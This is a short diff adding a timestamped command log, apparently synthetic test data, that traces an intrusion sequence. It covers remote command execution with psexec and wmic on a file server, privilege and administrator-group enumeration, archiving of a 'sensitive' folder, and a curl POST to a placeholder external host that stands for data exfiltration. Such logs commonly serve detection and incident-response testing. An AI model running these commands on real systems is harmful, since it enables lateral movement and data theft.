@@ -1,0 +1,7 @@
+2026-11-15T05:40:31.373435 | net use \\FILE-SRV01\share
+2026-11-15T05:40:31.373435 | wmic process call create cmd.exe
+2026-11-15T05:40:31.373435 | psexec \\FILE-SRV01 cmd
+2026-11-15T05:45:31.373435 | whoami /priv
+2026-11-15T05:45:31.373435 | net localgroup administrators
+2026-11-15T05:50:31.373435 | tar -czf data.tar.gz sensitive/
+2026-11-15T05:50:31.373435 | curl -X POST https://external-host/upload
